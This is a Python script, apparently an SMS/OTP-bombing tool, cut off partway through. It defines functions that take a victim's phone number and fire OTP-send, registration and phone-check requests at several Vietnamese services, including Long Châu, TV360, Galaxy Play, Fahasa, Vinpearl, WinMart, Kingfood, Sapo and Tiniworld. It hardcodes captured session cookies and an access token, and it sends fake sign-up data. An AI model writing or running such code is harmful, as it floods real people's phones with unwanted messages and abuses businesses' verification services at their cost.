import requests
import concurrent.futures
import time
import warnings
import json
import sys
import random
import string
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import threading
from requests.packages.urllib3.util.retry import Retry


warnings.filterwarnings("ignore", message="Unverified HTTPS request")

# Danh sách các họ, tên đệm và tên phổ biến
last_names = ['Nguyễn', 'Trần', 'Lê', 'Phạm', 'Vũ', 'Hoàng', 'Đặng', 'Bùi', 'Ngô', 'Dương', 'Lý', 'Trương', 'Phan', 'Tăng', 'Mai', 'Tôn', 'Nguyễn Văn', 'Nguyễn Thị']
middle_names = ['Văn', 'Thị', 'Quang', 'Hoàng', 'Anh', 'Thanh', 'Hữu', 'Đức', 'Minh', 'Thành', 'Ngọc', 'Khánh', 'Bảo', 'Công', 'Tuấn', 'Như', 'Tâm', 'Hà']
first_names = ['Nam', 'Tuấn', 'Hương', 'Linh', 'Long', 'Duy', 'An', 'Bình', 'Cường', 'Đạt', 'Hải', 'Khôi', 'Lâm', 'Mỹ', 'Phúc', 'Quốc', 'Sơn', 'Tú', 'Vi', 'Yến', 'Thảo']

# Hàm tạo tên ngẫu nhiên
def generate_random_name():
    last_name = random.choice(last_names)  # Chọn ngẫu nhiên họ
    # Chọn ngẫu nhiên tên đệm (có thể có hoặc không)
    middle_name = random.choice(middle_names) if random.choice([True, False]) else ''
    first_name = random.choice(first_names)  # Chọn ngẫu nhiên tên
    # Trả về tên đã được định dạng
    return f"{last_name} {middle_name} {first_name}".strip()

# Hàm tạo ID ngẫu nhiên
def generate_random_id():
    def random_segment(length):
        # Tạo đoạn ký tự ngẫu nhiên
        return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))
    
    # Tạo ID theo định dạng cụ thể
    return f"{random_segment(2)}7D7{random_segment(1)}6{random_segment(1)}E-D52E-46EA-8861-ED{random_segment(1)}BB{random_segment(2)}86{random_segment(3)}"

# Hàm định dạng ID thiết bị
def format_device_id(device_id):
    # Định dạng ID thành chuỗi dễ đọc
    return f"{device_id[:8]}-{device_id[8:12]}-{device_id[12:16]}-{device_id[16:20]}-{device_id[20:]}"

# Tạo ID ngẫu nhiên và định dạng
random_id = generate_random_id()
formatted_device_id = format_device_id(random_id)

##################################KHAI BÁO####################################

def longchau(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3',
        'access-control-allow-origin': '*',
        'content-type': 'application/json',
        'order-channel': '1',
        'origin': 'https://nhathuoclongchau.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://nhathuoclongchau.com.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
        'x-channel': 'EStore',
    }

    json_data0 = {
        'phoneNumber': sdt,
        'otpType': 0,
        'fromSys': 'WEBKHLC',
    }

    response0 = requests.post(
        'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',
        headers=headers,
        json=json_data0,
    )

    json_data1 = {
        'phoneNumber': sdt,
        'otpType': 1,
        'fromSys': 'WEBKHLC',
    }

    response1 = requests.post(
        'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',
        headers=headers,
        json=json_data1,
    )

    print(response0.text)
    print(response1.text)

def tv360(sdt):
    cookies = {
        'img-ext': 'avif',
        'NEXT_LOCALE': 'vi',
        'session-id': 's%3Aa2194f4f-cf75-4eca-8157-a9929bed6755.OT7EbVpEM%2FJN4%2Bl4RgAOa59CjIQS%2BgsFUEbwY2%2F1aOw',
        'device-id': 's%3Aweb_6b471a06-b3e4-4ae6-ae8e-81fce81b1e3d.QYLdnTz48nt63XYiLKLGw1RPaV%2BwYneKY%2BbECWwhCKY',
        'shared-device-id': 'web_6b471a06-b3e4-4ae6-ae8e-81fce81b1e3d',
        'screen-size': 's%3A1536x864.Gqa7zBdzIZ6z7BVJpD89%2BUgGTTzA6hzWEcrzL%2BA96qo',
        '_ga': 'GA1.2.1823307228.1722943404',
        '_gid': 'GA1.2.1943611339.1722943404',
        '_gat_UA-180935206-1': '1',
        'G_ENABLED_IDPS': 'google',
        '_ga_D7L53J0JMS': 'GS1.1.1722943404.1.1.1722943429.35.0.0',
        '_ga_E5YP28Y8EF': 'GS1.1.1722943404.1.1.1722943429.0.0.0',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3',
        'content-type': 'application/json',
        'origin': 'https://tv360.vn',
        'referer': 'https://tv360.vn/login?r=https%3A%2F%2Ftv360.vn%2Fpackages',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    }


    json_data = {
        'msisdn': sdt,
    }

    response = requests.post('https://tv360.vn/public/v1/auth/get-otp-login', cookies=cookies, headers=headers, json=json_data)

    print(response.text)

def galaxyplay(sdt):
    headers = {
        'accept': '*/*',
        'accept-language': 'vi',
        'access-token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzaWQiOiJjMmU0MjQ4Ny0wZmE3LTRlNzQtOWJjOC1mOGE2MzY5YzczNmYiLCJkaWQiOiJiNTgxMmM5YS1kZDY4LTQ0MTAtYTBkNS0wZGZlMjNhNWVjYmIiLCJpcCI6IjEuNTMuODIuNDEiLCJtaWQiOiJOb25lIiwicGx0Ijoid2VifG1vYmlsZXx3aW5kb3dzfDEwfGNocm9tZSIsImFwcF92ZXJzaW9uIjoiMi4wLjAiLCJpYXQiOjE3MjI5NDQxMjAsImV4cCI6MTczODQ5NjEyMH0.K7zpH1j-Fb2A5zKMDBKN3HRuETplJd1_ppjIWRhTxvQ',
        # 'content-length': '0',
        'origin': 'https://galaxyplay.vn',
        'priority': 'u=1, i',
        'referer': 'https://galaxyplay.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'phone': sdt,
    }

    response = requests.post('https://api.glxplay.io/account/phone/verify', params=params, headers=headers)

    print(response.text)

def fahasa(sdt):
    cookies = {
        'frontend': '11d3c3300684468487b0520573325f44',
        '_gcl_aw': 'GCL.1722945013.CjwKCAjwk8e1BhALEiwAc8MHiGSs_jfkgqXPl8EG40zuruuRqBl3f3HOBr5JHxUVuiCV03MJkqpqXBoCOaoQAvD_BwE',
        '_gcl_gs': '2.1.k1$i1722945012',
        '_gcl_au': '1.1.1932321402.1722945013',
        '_ga': 'GA1.1.148867950.1722945013',
        'utm_source': 'google',
        'frontend_cid': 'SpsHvVCTP9kz0Jo2',
        '_fbp': 'fb.1.1722945013279.323714212436588050',
        '_tt_enable_cookie': '1',
        '_ttp': 'DIQolSgGWN0jluFbePhiyg7Cnmk',
        '_clck': 'nm1axz%7C2%7Cfo3%7C0%7C1679',
        '_clsk': '1steei1%7C1722945014480%7C1%7C1%7Cp.clarity.ms%2Fcollect',
        'moe_uuid': '559fc690-c9d3-45d8-bfa0-e50e2907d426',
        'USER_DATA': '%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%22559fc690-c9d3-45d8-bfa0-e50e2907d426%22%2C%22deviceAdded%22%3Atrue%7D',
        'SOFT_ASK_STATUS': '%7B%22actualValue%22%3A%22not%20shown%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D',
        '_ga_460L9JMC2G': 'GS1.1.1722945012.1.1.1722945025.47.0.1939769616',
        'OPT_IN_SHOWN_TIME': '1722945028044',
        'HARD_ASK_STATUS': '%7B%22actualValue%22%3A%22dismissed%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D',
        'SESSION': '%7B%22sessionKey%22%3A%2238d6b0a9-23a8-4f2e-b402-7f0f030601cd%22%2C%22sessionStartTime%22%3A%222024-08-06T11%3A50%3A14.788Z%22%2C%22sessionMaxTime%22%3A1800%2C%22customIdentifiersToTrack%22%3A%5B%5D%2C%22sessionExpiryTime%22%3A1722946828049%2C%22numberOfSessions%22%3A3%2C%22currentSource%22%3A%7B%22source_url%22%3A%22https%3A%2F%2Fwww.fahasa.com%2F%3Futm_source%3Dgoogle%26utm_medium%3Dcpc_search%26utm_campaign%3Dtraffic_search_keyword%26utm_content%3Dkwd-298471633621%26utm_term%3Dfahasa%26gad_source%3D1%26gclid%3DCjwKCAjwk8e1BhALEiwAc8MHiGSs_jfkgqXPl8EG40zuruuRqBl3f3HOBr5JHxUVuiCV03MJkqpqXBoCOaoQAvD_BwE%23gad_source%3D1%22%2C%22source%22%3A%22google%22%2C%22medium%22%3A%22cpc_search%22%2C%22term%22%3A%22fahasa%22%2C%22campaign_name%22%3A%22traffic_search_keyword%22%2C%22content%22%3A%22kwd-298471633621%22%7D%7D',
    }
    
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'frontend=11d3c3300684468487b0520573325f44; _gcl_aw=GCL.1722945013.CjwKCAjwk8e1BhALEiwAc8MHiGSs_jfkgqXPl8EG40zuruuRqBl3f3HOBr5JHxUVuiCV03MJkqpqXBoCOaoQAvD_BwE; _gcl_gs=2.1.k1$i1722945012; _gcl_au=1.1.1932321402.1722945013; _ga=GA1.1.148867950.1722945013; utm_source=google; frontend_cid=SpsHvVCTP9kz0Jo2; _fbp=fb.1.1722945013279.323714212436588050; _tt_enable_cookie=1; _ttp=DIQolSgGWN0jluFbePhiyg7Cnmk; _clck=nm1axz%7C2%7Cfo3%7C0%7C1679; _clsk=1steei1%7C1722945014480%7C1%7C1%7Cp.clarity.ms%2Fcollect; moe_uuid=559fc690-c9d3-45d8-bfa0-e50e2907d426; USER_DATA=%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%22559fc690-c9d3-45d8-bfa0-e50e2907d426%22%2C%22deviceAdded%22%3Atrue%7D; SOFT_ASK_STATUS=%7B%22actualValue%22%3A%22not%20shown%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D; _ga_460L9JMC2G=GS1.1.1722945012.1.1.1722945025.47.0.1939769616; OPT_IN_SHOWN_TIME=1722945028044; HARD_ASK_STATUS=%7B%22actualValue%22%3A%22dismissed%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D; SESSION=%7B%22sessionKey%22%3A%2238d6b0a9-23a8-4f2e-b402-7f0f030601cd%22%2C%22sessionStartTime%22%3A%222024-08-06T11%3A50%3A14.788Z%22%2C%22sessionMaxTime%22%3A1800%2C%22customIdentifiersToTrack%22%3A%5B%5D%2C%22sessionExpiryTime%22%3A1722946828049%2C%22numberOfSessions%22%3A3%2C%22currentSource%22%3A%7B%22source_url%22%3A%22https%3A%2F%2Fwww.fahasa.com%2F%3Futm_source%3Dgoogle%26utm_medium%3Dcpc_search%26utm_campaign%3Dtraffic_search_keyword%26utm_content%3Dkwd-298471633621%26utm_term%3Dfahasa%26gad_source%3D1%26gclid%3DCjwKCAjwk8e1BhALEiwAc8MHiGSs_jfkgqXPl8EG40zuruuRqBl3f3HOBr5JHxUVuiCV03MJkqpqXBoCOaoQAvD_BwE%23gad_source%3D1%22%2C%22source%22%3A%22google%22%2C%22medium%22%3A%22cpc_search%22%2C%22term%22%3A%22fahasa%22%2C%22campaign_name%22%3A%22traffic_search_keyword%22%2C%22content%22%3A%22kwd-298471633621%22%7D%7D',
        'origin': 'https://www.fahasa.com',
        'priority': 'u=1, i',
        'referer': 'https://www.fahasa.com/?utm_source=google&utm_medium=cpc_search&utm_campaign=traffic_search_keyword&utm_content=kwd-298471633621&utm_term=fahasa&gad_source=1&gclid=CjwKCAjwk8e1BhALEiwAc8MHiGSs_jfkgqXPl8EG40zuruuRqBl3f3HOBr5JHxUVuiCV03MJkqpqXBoCOaoQAvD_BwE',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'traceparent': '00-34c99892f4898e41bb11f599e55d3559-b398d43d9667815f-01',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    
    data = {
        'phone': sdt,
    }
    
    response = requests.post('https://www.fahasa.com/ajaxlogin/ajax/checkPhone', cookies=cookies, headers=headers, data=data)
    print(response.text)

def vinpearl(sdt):
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN',
        'access-control-allow-headers': 'Accept, X-Requested-With, Content-Type, Authorization, Access-Control-Allow-Headers',
        'authorization': 'Bearer undefined',
        'content-type': 'application/json',
        'origin': 'https://booking.vinpearl.com',
        'priority': 'u=1, i',
        'referer': 'https://booking.vinpearl.com/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
        'x-display-currency': 'VND',
    }

    # Chuyển đổi số điện thoại sang định dạng +84
    if sdt.startswith('0'):
        sdt = '+84' + sdt[1:]
    else:
        sdt = '+84' + sdt

    json_data = {
        'channel': 'vpt',
        'username': sdt,
        'type': 1,
        'OtpChannel': 1,
    }

    response = requests.post(
        'https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp',
        headers=headers,
        json=json_data,
    )

    print(response.text)

def winmart(sdt):
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3',
        'authorization': 'Bearer undefined',
        'content-type': 'application/json',
        'origin': 'https://winmart.vn',
        'priority': 'u=1, i',
        'referer': 'https://winmart.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
        'x-api-merchant': 'WCM',
    }
    
    json_data = {
        'firstName': 'lee vinh khang',
        'phoneNumber': sdt,
        'masanReferralCode': '',
        'dobDate': '2000-08-01',
        'gender': 'Male',
    }
    
    response = requests.post('https://api-crownx.winmart.vn/iam/api/v1/user/register', headers=headers, json=json_data)
    
    print(response.text)

def kingfood(sdt):
    cookies = {
        '_gcl_au': '1.1.986949015.1722946906',
        '_ga': 'GA1.1.1440256320.1722946906',
        '_ss': '982606.1722946907',
        '_stid': '17229469072291609',
        '_fbp': 'fb.1.1722946907440.12095736334109049',
        '_ga_0N4C0W7H0P': 'GS1.1.1722946906.1.1.1722946948.18.0.0',
        '_ga_TZN092VLC1': 'GS1.1.1722946906.1.1.1722946948.18.0.0',
        '_ga_GS6YXJEMLX': 'GS1.1.1722946906.1.1.1722946948.18.0.0',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3',
        # 'cookie': '_gcl_au=1.1.986949015.1722946906; _ga=GA1.1.1440256320.1722946906; _ss=982606.1722946907; _stid=17229469072291609; _fbp=fb.1.1722946907440.12095736334109049; _ga_0N4C0W7H0P=GS1.1.1722946906.1.1.1722946948.18.0.0; _ga_TZN092VLC1=GS1.1.1722946906.1.1.1722946948.18.0.0; _ga_GS6YXJEMLX=GS1.1.1722946906.1.1.1722946948.18.0.0',
        'priority': 'u=1, i',
        'referer': 'https://kingfoodmart.com/login/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
        'x-nextjs-data': '1',
        'Referer': 'https://kingfoodmart.com/otp/?phone={sdt}',
    }

    params = {
        'phone': sdt,
    }

    json_data = {
        'operationName': 'SendOtp',
        'variables': {
            'input': {
                'phone': sdt,
                'captchaSignature': 'AWNCXZZicc3JbX_VKgjVmY3uNEapQ7Wh3HP2rCn--1EwjXDWnddyZmEz-n2DnVqaQ9fCVpFf16FA2EDgLBw74DDdZS0QNZqZ9qpTBUhOyw9JafO-oHx08ZrBfOCyA1k2jBlq1eGqFob8N1iJBExvhA:U=d54b00cea0000000',
            },
        },
        'query': 'mutation SendOtp($input: SendOtpInput!) {\n  sendOtp(input: $input) {\n    otpTrackingId\n    __typename\n  }\n}',
    }

    response = requests.post('https://api.onelife.vn/v1/gateway/', headers=headers, json=json_data)

    response = requests.get(
        'https://kingfoodmart.com/_next/data/99XW5-uValT5xdXRgqFL_/otp.json',
        params=params,
        cookies=cookies,
        headers=headers,
    )
    print(response.text)

def sapovn(sdt):
    cookies = {
        'referral': 'https://www.google.com/',
        'landing_page': 'https://www.sapo.vn/phan-mem-quan-ly-nha-hang.html?utm_source=google_ads&utm_campaign=qc_gg_search&utm_medium=nhu_cau&utm_content=text_fnb_090622_pm_tinh_tien&gad_source=1&gclid=CjwKCAjwk8e1BhALEiwAc8MHiCG_HEU3jz6xfgZkpc7vNjH1tnu3N0zOGeZgOkleITOnJaJIjwsOuRoCgUMQAvD_BwE#gad_source=1',
        'start_time': '08/06/2024 19:40:22',
        'pageview': '1',
        '_hjSessionUser_3167213': 'eyJpZCI6IjU4ZDAzZTg4LWIwODctNTdkNC1iNGJmLTcwMzAwY2MzNjI0NSIsImNyZWF0ZWQiOjE3MjI5NDgwMjI2MDEsImV4aXN0aW5nIjpmYWxzZX0=',
        '_hjSession_3167213': 'eyJpZCI6ImUyODk1ZWQ2LTM1MjctNDllZC05YmJmLTlmMmYyOTJiZWNjYSIsImMiOjE3MjI5NDgwMjI2MDIsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=',
        '_gcl_gs': '2.1.k1$i1722948022',
        '_gcl_au': '1.1.1338082816.1722948023',
        '_fbp': 'fb.1.1722948023052.368523831571208157',
        '_gid': 'GA1.2.858070663.1722948025',
        '_gac_UA-66880228-3': '1.1722948025.CjwKCAjwk8e1BhALEiwAc8MHiCG_HEU3jz6xfgZkpc7vNjH1tnu3N0zOGeZgOkleITOnJaJIjwsOuRoCgUMQAvD_BwE',
        '_dc_gtm_UA-66880228-3': '1',
        '_ga_4NX0F91DEX': 'GS1.2.1722948025.1.0.1722948025.0.0.0',
        '_ce.irv': 'new',
        'cebs': '1',
        '_ce.clock_event': '1',
        '_ce.clock_data': '-275%2C1.53.82.41%2C1%2C362d7fe3d8b2581bffa359f0eeda7106%2CChrome%2CVN',
        'cebsp_': '1',
        '_gac_UA-66880228-1': '1.1722948028.CjwKCAjwk8e1BhALEiwAc8MHiCG_HEU3jz6xfgZkpc7vNjH1tnu3N0zOGeZgOkleITOnJaJIjwsOuRoCgUMQAvD_BwE',
        '_dc_gtm_UA-66880228-1': '1',
        '_gac_UA-239546923-1': '1.1722948028.CjwKCAjwk8e1BhALEiwAc8MHiCG_HEU3jz6xfgZkpc7vNjH1tnu3N0zOGeZgOkleITOnJaJIjwsOuRoCgUMQAvD_BwE',
        '_gat_UA-239546923-1': '1',
        '_ga': 'GA1.1.1551573493.1722948023',
        '_ga_Y9YZPDEGP0': 'GS1.1.1722948028.1.0.1722948028.60.0.0',
        '_ga_GECRBQV6JK': 'GS1.1.1722948028.1.0.1722948028.60.0.0',
        '_ga_YNVPPJ8MZP': 'GS1.1.1722948028.1.0.1722948028.60.0.0',
        '_ga_CDD1S5P7D4': 'GS1.1.1722948028.1.0.1722948028.60.0.0',
        '_ga_8956TVT2M3': 'GS1.1.1722948028.1.0.1722948028.60.0.0',
        '_gcl_aw': 'GCL.1722948029.CjwKCAjwk8e1BhALEiwAc8MHiCG_HEU3jz6xfgZkpc7vNjH1tnu3N0zOGeZgOkleITOnJaJIjwsOuRoCgUMQAvD_BwE',
        '_ga_EBZKH8C7MK': 'GS1.2.1722948029.1.0.1722948029.0.0.0',
        'source': 'https://www.sapo.vn/phan-mem-quan-ly-nha-hang.html?utm_source=google_ads&utm_campaign=qc_gg_search&utm_medium=nhu_cau&utm_content=text_fnb_090622_pm_tinh_tien&gad_source=1&gclid=CjwKCAjwk8e1BhALEiwAc8MHiCG_HEU3jz6xfgZkpc7vNjH1tnu3N0zOGeZgOkleITOnJaJIjwsOuRoCgUMQAvD_BwE#gad_source=1',
        '_ga_HXMGB9WRVX': 'GS1.1.1722948028.1.0.1722948037.51.0.0',
        '_ga_P9DPF3E00F': 'GS1.1.1722948023.1.0.1722948042.0.0.0',
        '_ga_8Z6MB85ZM2': 'GS1.1.1722948029.1.0.1722948042.47.0.0',
        '_ce.s': 'v~ee815e38ce511cb5d370c51bc9a8606fb1352541~lcw~1722948063408~lva~1722948026308~vpv~0~v11.fhb~1722948026521~v11.lhb~1722948026522~v11.cs~200798~v11.s~0e6134d0-53f1-11ef-b5c8-6f2902cc34cb~v11.sla~1722948063418~lcw~1722948063418',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'referral=https://www.google.com/; landing_page=https://www.sapo.vn/phan-mem-quan-ly-nha-hang.html?utm_source=google_ads&utm_campaign=qc_gg_search&utm_medium=nhu_cau&utm_content=text_fnb_090622_pm_tinh_tien&gad_source=1&gclid=CjwKCAjwk8e1BhALEiwAc8MHiCG_HEU3jz6xfgZkpc7vNjH1tnu3N0zOGeZgOkleITOnJaJIjwsOuRoCgUMQAvD_BwE#gad_source=1; start_time=08/06/2024 19:40:22; pageview=1; _hjSessionUser_3167213=eyJpZCI6IjU4ZDAzZTg4LWIwODctNTdkNC1iNGJmLTcwMzAwY2MzNjI0NSIsImNyZWF0ZWQiOjE3MjI5NDgwMjI2MDEsImV4aXN0aW5nIjpmYWxzZX0=; _hjSession_3167213=eyJpZCI6ImUyODk1ZWQ2LTM1MjctNDllZC05YmJmLTlmMmYyOTJiZWNjYSIsImMiOjE3MjI5NDgwMjI2MDIsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; _gcl_gs=2.1.k1$i1722948022; _gcl_au=1.1.1338082816.1722948023; _fbp=fb.1.1722948023052.368523831571208157; _gid=GA1.2.858070663.1722948025; _gac_UA-66880228-3=1.1722948025.CjwKCAjwk8e1BhALEiwAc8MHiCG_HEU3jz6xfgZkpc7vNjH1tnu3N0zOGeZgOkleITOnJaJIjwsOuRoCgUMQAvD_BwE; _dc_gtm_UA-66880228-3=1; _ga_4NX0F91DEX=GS1.2.1722948025.1.0.1722948025.0.0.0; _ce.irv=new; cebs=1; _ce.clock_event=1; _ce.clock_data=-275%2C1.53.82.41%2C1%2C362d7fe3d8b2581bffa359f0eeda7106%2CChrome%2CVN; cebsp_=1; _gac_UA-66880228-1=1.1722948028.CjwKCAjwk8e1BhALEiwAc8MHiCG_HEU3jz6xfgZkpc7vNjH1tnu3N0zOGeZgOkleITOnJaJIjwsOuRoCgUMQAvD_BwE; _dc_gtm_UA-66880228-1=1; _gac_UA-239546923-1=1.1722948028.CjwKCAjwk8e1BhALEiwAc8MHiCG_HEU3jz6xfgZkpc7vNjH1tnu3N0zOGeZgOkleITOnJaJIjwsOuRoCgUMQAvD_BwE; _gat_UA-239546923-1=1; _ga=GA1.1.1551573493.1722948023; _ga_Y9YZPDEGP0=GS1.1.1722948028.1.0.1722948028.60.0.0; _ga_GECRBQV6JK=GS1.1.1722948028.1.0.1722948028.60.0.0; _ga_YNVPPJ8MZP=GS1.1.1722948028.1.0.1722948028.60.0.0; _ga_CDD1S5P7D4=GS1.1.1722948028.1.0.1722948028.60.0.0; _ga_8956TVT2M3=GS1.1.1722948028.1.0.1722948028.60.0.0; _gcl_aw=GCL.1722948029.CjwKCAjwk8e1BhALEiwAc8MHiCG_HEU3jz6xfgZkpc7vNjH1tnu3N0zOGeZgOkleITOnJaJIjwsOuRoCgUMQAvD_BwE; _ga_EBZKH8C7MK=GS1.2.1722948029.1.0.1722948029.0.0.0; source=https://www.sapo.vn/phan-mem-quan-ly-nha-hang.html?utm_source=google_ads&utm_campaign=qc_gg_search&utm_medium=nhu_cau&utm_content=text_fnb_090622_pm_tinh_tien&gad_source=1&gclid=CjwKCAjwk8e1BhALEiwAc8MHiCG_HEU3jz6xfgZkpc7vNjH1tnu3N0zOGeZgOkleITOnJaJIjwsOuRoCgUMQAvD_BwE#gad_source=1; _ga_HXMGB9WRVX=GS1.1.1722948028.1.0.1722948037.51.0.0; _ga_P9DPF3E00F=GS1.1.1722948023.1.0.1722948042.0.0.0; _ga_8Z6MB85ZM2=GS1.1.1722948029.1.0.1722948042.47.0.0; _ce.s=v~ee815e38ce511cb5d370c51bc9a8606fb1352541~lcw~1722948063408~lva~1722948026308~vpv~0~v11.fhb~1722948026521~v11.lhb~1722948026522~v11.cs~200798~v11.s~0e6134d0-53f1-11ef-b5c8-6f2902cc34cb~v11.sla~1722948063418~lcw~1722948063418',
        'origin': 'https://www.sapo.vn',
        'priority': 'u=1, i',
        'referer': 'https://www.sapo.vn/phan-mem-quan-ly-nha-hang.html?utm_source=google_ads&utm_campaign=qc_gg_search&utm_medium=nhu_cau&utm_content=text_fnb_090622_pm_tinh_tien&gad_source=1&gclid=CjwKCAjwk8e1BhALEiwAc8MHiCG_HEU3jz6xfgZkpc7vNjH1tnu3N0zOGeZgOkleITOnJaJIjwsOuRoCgUMQAvD_BwE',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',

    }

    params = {
        'phonenumber': sdt,
    }
    data = {
        'phonenumber': sdt,
    }

    response = requests.post('https://www.sapo.vn/fnb/SendOTPnxxhPN5Zy5', cookies=cookies, headers=headers, data=data)
    response = requests.get('https://www.sapo.vn/fnb/checkphonenumber', params=params, cookies=cookies, headers=headers)

    print(response.text)

def tiniworld(sdt):
    cookies = {
        'connect.sid': 's%3Ak9RDzUojUfF3yrSeGZxtMJoKmfnh6Ycr.0HjaJGMXSU4ND1bKewK4CAo%2FdUffibCcyWTDwwzs6%2FM',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': 'connect.sid=s%3Ak9RDzUojUfF3yrSeGZxtMJoKmfnh6Ycr.0HjaJGMXSU4ND1bKewK4CAo%2FdUffibCcyWTDwwzs6%2FM',
        'origin': 'https://prod-tini-id.nkidworks.com',
        'priority': 'u=0, i',
        'referer': 'https://prod-tini-id.nkidworks.com/login?clientId=609168b9f8d5275ea1e262d6&requiredLogin=true&redirectUrl=https://tiniworld.com',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
